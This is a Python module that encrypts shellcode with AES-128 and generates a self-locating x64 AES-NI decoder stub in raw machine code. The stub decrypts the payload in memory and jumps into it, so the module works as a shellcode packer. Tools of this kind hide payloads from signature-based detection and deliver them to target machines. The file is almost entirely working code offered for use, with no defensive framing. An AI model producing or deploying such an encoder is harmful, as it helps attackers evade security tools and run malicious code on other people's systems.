#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""AES-128 shellcode encryption and x64 AES-NI decoder stubs."""

from __future__ import annotations

import os
import struct
from dataclasses import dataclass
from typing import List, Optional

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def _aes_ecb_encrypt(key: bytes, data: bytes) -> bytes:
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()


def _aes_ecb_decrypt(key: bytes, data: bytes) -> bytes:
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(data) + decryptor.finalize()


BLOCK_SIZE = 16
AES128_ROUNDS = 10
SCHEDULE_BYTES = (AES128_ROUNDS + 1) * BLOCK_SIZE
METADATA_BYTES = 4  # original shellcode length (little-endian)

SBOX = [
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
]

RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36]


@dataclass(frozen=True)
class AesShellcodePackage:
    """Encrypted shellcode bundle for x64 AES-NI decoders."""

    key: bytes
    decrypt_schedule: bytes
    original_length: int
    ciphertext: bytes
    decoder: bytes

    def assemble(self) -> bytes:
        return (
            self.decoder
            + self.decrypt_schedule
            + struct.pack("<I", self.original_length)
            + self.ciphertext
        )


def pad_shellcode_nop(shellcode: bytes) -> bytes:
    """Pad shellcode to a 16-byte boundary with NOPs (safe trailing sled)."""
    remainder = len(shellcode) % BLOCK_SIZE
    if remainder == 0:
        return shellcode
    return shellcode + (b"\x90" * (BLOCK_SIZE - remainder))


def _xtime(value: int) -> int:
    value &= 0xFF
    if value & 0x80:
        return ((value << 1) ^ 0x1B) & 0xFF
    return (value << 1) & 0xFF


def _gf_mul(a: int, b: int) -> int:
    result = 0
    for _ in range(8):
        if b & 1:
            result ^= a
        a = _xtime(a)
        b >>= 1
    return result & 0xFF


def _aesimc(block: bytes) -> bytes:
    state = list(block)
    out = [0] * 16
    for col in range(4):
        c0, c1, c2, c3 = (state[col + 4 * row] for row in range(4))
        out[col + 0] = _gf_mul(0x0E, c0) ^ _gf_mul(0x0B, c1) ^ _gf_mul(0x0D, c2) ^ _gf_mul(0x09, c3)
        out[col + 4] = _gf_mul(0x09, c0) ^ _gf_mul(0x0E, c1) ^ _gf_mul(0x0B, c2) ^ _gf_mul(0x0D, c3)
        out[col + 8] = _gf_mul(0x0D, c0) ^ _gf_mul(0x09, c1) ^ _gf_mul(0x0E, c2) ^ _gf_mul(0x0B, c3)
        out[col + 12] = _gf_mul(0x0B, c0) ^ _gf_mul(0x0D, c1) ^ _gf_mul(0x09, c2) ^ _gf_mul(0x0E, c3)
    return bytes(out)


def aes128_expand_encrypt_schedule(key: bytes) -> bytes:
    if len(key) != BLOCK_SIZE:
        raise ValueError("AES-128 key must be 16 bytes")
    schedule = list(key)
    rcon_index = 0
    while len(schedule) < SCHEDULE_BYTES:
        temp = schedule[-4:]
        if len(schedule) % BLOCK_SIZE == 0:
            temp = [SBOX[b] for b in temp[1:] + temp[:1]]
            temp[0] ^= RCON[rcon_index]
            rcon_index += 1
        for byte in temp:
            schedule.append(schedule[len(schedule) - BLOCK_SIZE] ^ byte)
    return bytes(schedule[:SCHEDULE_BYTES])


def aes128_decrypt_schedule(key: bytes) -> bytes:
    enc = aes128_expand_encrypt_schedule(key)
    round_keys = [enc[index : index + BLOCK_SIZE] for index in range(0, SCHEDULE_BYTES, BLOCK_SIZE)]
    decrypt_keys: List[bytes] = [b""] * (AES128_ROUNDS + 1)
    decrypt_keys[0] = round_keys[AES128_ROUNDS]
    decrypt_keys[AES128_ROUNDS] = round_keys[0]
    for index in range(1, AES128_ROUNDS):
        decrypt_keys[index] = _aesimc(round_keys[AES128_ROUNDS - index])
    return b"".join(decrypt_keys)


def aes128_encrypt_shellcode(shellcode: bytes, key: Optional[bytes] = None) -> tuple[bytes, bytes, bytes, int]:
    if not shellcode:
        raise ValueError("shellcode must not be empty")
    key = key or os.urandom(BLOCK_SIZE)
    if len(key) != BLOCK_SIZE:
        raise ValueError("AES-128 key must be 16 bytes")
    padded = pad_shellcode_nop(shellcode)
    ciphertext = _aes_ecb_encrypt(key, padded)
    schedule = aes128_decrypt_schedule(key)
    return key, schedule, ciphertext, len(shellcode)


def _emit_movdqu_xmm1_r14_disp(code: bytearray, disp: int) -> None:
    if not 0 <= disp <= 255:
        raise ValueError("round-key displacement must fit in one byte for this stub")
    code.extend(b"\x66\x41\x0F\x6F\x4E")
    code.append(disp)


def build_x64_aesni_decoder(block_count: int) -> bytes:
    if block_count <= 0:
        raise ValueError("block_count must be positive")

    code = bytearray()
    code.extend(b"\xE8\x00\x00\x00\x00")  # call $+5
    pop_rbx_offset = len(code)
    code.append(0x5B)  # pop rbx

    code.extend(b"\x4C\x8D\xB3")  # lea r14, [rbx + schedule_disp]
    schedule_disp_offset = len(code)
    code.extend(b"\x00\x00\x00\x00")

    code.extend(b"\x48\x8D\xB3")  # lea rsi, [rbx + cipher_disp]
    cipher_disp_offset = len(code)
    code.extend(b"\x00\x00\x00\x00")

    code.extend(b"\x48\xC7\xC1")  # mov rcx, imm32
    code.extend(struct.pack("<I", block_count))

    loop_start = len(code)
    code.extend(b"\x0F\x6F\x06")  # movdqu xmm0, [rsi]
    for disp in range(160, 0, -16):
        _emit_movdqu_xmm1_r14_disp(code, disp)
        code.extend(b"\x66\x0F\x38\xDE\xC1")  # aesdec xmm0, xmm1
    _emit_movdqu_xmm1_r14_disp(code, 0)
    code.extend(b"\x66\x0F\x38\xDF\xC1")  # aesdeclast xmm0, xmm1
    code.extend(b"\x0F\x7F\x06")  # movdqu [rsi], xmm0
    code.extend(b"\x48\x83\xC6\x10")  # add rsi, 16
    code.extend(b"\x48\xFF\xC9")  # dec rcx
    code.extend(b"\x75")
    code.append((loop_start - (len(code) + 1)) & 0xFF)

    code.extend(b"\x48\x8D\x83")  # lea rax, [rbx + cipher_disp]
    jump_disp_offset = len(code)
    code.extend(b"\x00\x00\x00\x00")
    code.extend(b"\xFF\xE0")  # jmp rax

    decoder_len = len(code)
    rbx_anchor = pop_rbx_offset + 1
    schedule_disp = decoder_len - rbx_anchor
    cipher_disp = decoder_len + SCHEDULE_BYTES + METADATA_BYTES - rbx_anchor
    struct.pack_into("<i", code, schedule_disp_offset, schedule_disp)
    struct.pack_into("<i", code, cipher_disp_offset, cipher_disp)
    struct.pack_into("<i", code, jump_disp_offset, cipher_disp)
    return bytes(code)


def encode_shellcode_aes128_x64(shellcode: bytes, key: Optional[bytes] = None) -> AesShellcodePackage:
    key, schedule, ciphertext, original_length = aes128_encrypt_shellcode(shellcode, key=key)
    block_count = len(ciphertext) // BLOCK_SIZE
    decoder = build_x64_aesni_decoder(block_count)
    return AesShellcodePackage(
        key=key,
        decrypt_schedule=schedule,
        original_length=original_length,
        ciphertext=ciphertext,
        decoder=decoder,
    )
